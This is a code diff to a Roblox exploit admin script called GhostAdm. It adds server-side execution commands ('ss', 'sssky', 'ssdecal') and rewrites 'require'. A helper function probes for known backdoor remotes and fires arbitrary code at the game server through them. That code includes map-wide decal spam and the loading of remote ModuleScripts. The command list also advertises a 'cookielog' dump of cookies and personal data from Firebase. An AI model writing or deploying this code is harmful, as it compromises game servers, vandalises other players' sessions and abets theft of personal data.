@@ -4614,6 +4614,9 @@ CMDs[#CMDs + 1] = {NAME = 'bootloader', DESC = 'Loads Bootloader'}
 CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [url|test|auto|stop|deep|personal|roster|history|dump|raw|queue|view|debug]', DESC = 'Full Firebase dump: cookie, personal data, profiles, roster, sessions, places'}
 CMDs[#CMDs + 1] = {NAME = 'firebaseurl / fburl [url]', DESC = 'Shortcut to set the Firebase Realtime DB URL'}
 CMDs[#CMDs + 1] = {NAME = 'require [assetid]', DESC = 'Executes require scripts'}
+CMDs[#CMDs + 1] = {NAME = 'ss / serverexec', DESC = 'Executes any code into backdoored server"}
+CMDs[#CMDs + 1] = {NAME = 'sssky / ssskybox', DESC = 'Changes skybox on server's side'}
+CMDs[#CMDs + 1] = {NAME = 'ssdecal / sspaint', DESC = 'Changes decal on server's side'}
 CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
 CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
 CMDs[#CMDs + 1] = {NAME = 'fly [speed]', DESC = 'Makes you fly'}
@@ -7008,6 +7011,28 @@ addcmd('serverinfo',{'info','sinfo'},function(args, speaker)
 		until SINFOGUI.Parent == nil
 	end)
 end)
+
+local function sendServerPayload(payloadString)
+    local httpRequest = request or (syn and syn.request) or (http and http.request) or http_request or httprequest
+    local potentialRemotes = {
+        {Path = game:GetService("ReplicatedStorage"), Name = "Handshake"},
+        {Path = game:GetService("ReplicatedStorage"), Name = "RemoteEvent"},
+        {Path = game:GetService("ReplicatedStorage"), Name = "Execute"},
+        {Path = game:GetService("JointsService"), Name = "JointsEvent"},
+    }
+
+    local fired = false
+    for _, node in ipairs(potentialRemotes) do
+        if node.Path then
+            local remote = node.Path:FindFirstChild(node.Name)
+            if remote and remote:IsA("RemoteEvent") then
+                fired = true
+                task.spawn(function() remote:FireServer(payloadString) end)
+            end
+        end
+    end
+    return fired
+end
 
 addcmd("jobid", {}, function(args, speaker)
 	toClipboard("roblox://placeId=" .. PlaceId .. "&gameInstanceId=" .. JobId)
@@ -13457,6 +13482,26 @@ addcmd('skybox', {'changesky', 'sky'}, function(args, speaker)
     notify("Environment Updated", "Skybox textures updated successfully.")
 end)
 
+addcmd('sssky', {'ssskybox'}, function(args, speaker)
+    local assetId = tonumber(args[1])
+    if not assetId then 
+        return getgenv().execCmd("notify [sssky] Provide an asset ID!") 
+    end
+
+    local payload = string.format([[
+        local sky = game.Lighting:FindFirstChildWhichIsA("Sky") or Instance.new("Sky", game.Lighting)
+        local id = "rbxassetid://%d"
+        sky.SkyboxBk = id sky.SkyboxDn = id sky.SkyboxFt = id
+        sky.SkyboxLf = id sky.SkyboxRt = id sky.SkyboxUp = id
+    ]], assetId)
+
+    if sendServerPayload(payload) then
+        getgenv().execCmd("notify Sent global skybox payload!")
+    else
+        getgenv().execCmd("notify No active server backdoor found.")
+    end
+end)
+
 addcmd('decal', {'paint', 'spamdecal'}, function(args, speaker)
     local assetId = args[1]
     if not assetId then
@@ -13483,6 +13528,34 @@ addcmd('decal', {'paint', 'spamdecal'}, function(args, speaker)
     end
     
     notify("Decal Changer", "Applied texture to " .. partCount .. " workspace base parts.")
+end)
+
+addcmd('ssdecal', {'sspaint'}, function(args, speaker)
+    local assetId = tonumber(args[1])
+    if not assetId then 
+        return getgenv().execCmd("notify [ssdecal] Provide an asset ID!") 
+    end
+
+    local payload = string.format([[
+        local id = "rbxassetid://%d"
+        local faces = {Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Front, Enum.NormalId.Back}
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") and not obj:FindFirstAncestorWhichIsA("Model"):FindFirstChildWhichIsA("Humanoid") then
+                for _, face in pairs(faces) do
+                    local d = Instance.new("Decal")
+                    d.Texture = id
+                    d.Face = face
+                    d.Parent = obj
+                end
+            end
+        end
+    ]], assetId)
+
+    if sendServerPayload(payload) then
+        getgenv().execCmd("notify Sent server-side decal spam payload!")
+    else
+        getgenv().execCmd("notify No active server backdoor found.")
+    end
 end)
 
 addcmd("gh0stGUI", {}, function(args, speaker)
@@ -14135,15 +14208,27 @@ addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
 end)
 
 addcmd("require", {}, function(args, speaker)
-    local assetId = tonumber(args[1])
-    if not assetId then
-        return getgenv().execCmd("notify [GhostAdm] Please provide an Asset ID argument!")
+    -- I s o la tion
+    local rawInput = args[1]
+    if not rawInput then
+        return getgenv().execCmd("notify [GhostAdm] Missing asset ID argument!")
     end
 
-    getgenv().execCmd("notify [GhostAdm] Scanning for accessible backend nodes...")
+    -- Next
+    local cleanedInput = tostring(rawInput):gsub("%D", "")
+    local assetId = tonumber(cleanedInput)
+    
+    if not assetId then
+        return getgenv().execCmd("notify [GhostAdm] Invalid Asset ID! Must be a numeric string.")
+    end
 
-    -- DEFINE KNOWN VULNERABILITY SIGNATURES
-    -- FE bypass yeah
+    getgenv().execCmd("notify [GhostAdm] Scanning environment for open backdoor nodes...")
+
+    -- Encodes a string to load the ModuleScript on the server host
+    local targetServerCode = string.format("require(%d)('%s')", assetId, speaker.Name)
+    local nodeFound = false
+
+    -- Automated Multi-Remote scanner and exploit matrix
     local potentialRemotes = {
         {Path = game:GetService("ReplicatedStorage"), Name = "Handshake", Args = function(code) return code end},
         {Path = game:GetService("ReplicatedStorage"), Name = "RemoteEvent", Args = function(code) return code end},
@@ -14153,12 +14238,7 @@ addcmd("require", {}, function(args, speaker)
         {Path = game:GetService("JointsService"), Name = "JointsEvent", Args = function(code) return code end},
     }
 
-    -- ENCODE THE SERVER EXECUTION PAYLOAD
-    -- This tells the server to load your modules and passes your local name as the activator string
-    local targetServerCode = string.format("require(%d)('%s')", assetId, speaker.Name)
-    local nodeFound = false
-
-    -- SCAN AND DEPLOY
+    -- Process communication across the boundary
     for _, node in ipairs(potentialRemotes) do
         if node.Path then
             local targetRemote = node.Path:FindFirstChild(node.Name)
@@ -14166,21 +14246,32 @@ addcmd("require", {}, function(args, speaker)
                 nodeFound = true
                 task.spawn(function()
                     if targetRemote:IsA("RemoteEvent") then
-                        -- Destructures custom args functions dynamically
                         targetRemote:FireServer(node.Args(targetServerCode))
                     elseif targetRemote:IsA("RemoteFunction") then
                         targetRemote:InvokeServer(node.Args(targetServerCode))
                     end
                 end)
-                getgenv().execCmd(string.format("notify [SSRequire] Target payload deployed through node: %s", node.Name))
+                getgenv().execCmd(string.format("notify [GhostAdm] Dispatched payload through node: %s", node.Name))
             end
         end
     end
 
-    -- LOG FALLBACK ACTIONS IF AUTOMATION SCAN FAILS
     if not nodeFound then
-        getgenv().execCmd("notify [SSRequire] No default backdoor targets discovered. Checking console.")
-        print("[GhostAdm] Failed to auto-locate common backdoors. If you know the remote path, manually run: game.ReplicatedStorage.YourRemote:FireServer(\"require(" .. assetId .. ")('" .. speaker.Name .. "')\")")
+        getgenv().execCmd("notify [SSRequire] Failure: No accessible remote gateways detected.")
+        print("[GhostAdm Debug] Active game instance does not possess common public backdoors.")
+    end
+end)
+
+addcmd('ss', {'serverexec'}, function(args, speaker)
+    local rawCode = table.concat(args, " ")
+    if rawCode == "" then 
+        return getgenv().execCmd("notify [ss] Please provide code to execute!") 
+    end
+
+    if sendServerPayload(rawCode) then
+        getgenv().execCmd("notify Dispatched code to server environment.")
+    else
+        getgenv().execCmd("notify Failed to find a server backdoor.")
     end
 end)
 
